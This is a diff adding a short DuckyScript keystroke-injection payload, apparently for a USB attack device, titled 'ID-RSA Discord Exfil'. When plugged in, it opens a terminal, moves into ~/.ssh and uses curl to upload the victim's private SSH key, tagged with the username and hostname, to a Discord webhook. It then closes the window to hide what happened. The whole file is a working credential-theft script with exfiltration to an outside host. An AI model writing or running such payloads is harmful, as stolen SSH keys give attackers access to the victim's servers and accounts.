@@ -1,0 +1,17 @@
+REM Title: ID-RSA Discord Exfil
+REM Author: UndedInside
+REM Description: Exfils id-rsa over Discord
+
+REM Open terminal:
+DEFAULT_DELAY 400
+ALT t
+DELAY 500
+STRINGLN cd ~/.ssh
+
+REM Enumerate info and exfil private SSH key
+STRINGLN info=`whoami`@`hostname`
+STRINGLN curl -F 'payload_json={"username": "'"$info"'", "content": "SSH Key:"}' -F "file1=@id_rsa" "[WEBHOOK URL]"
+
+REM Cleanup:
+DELAY 500
+ALT F4
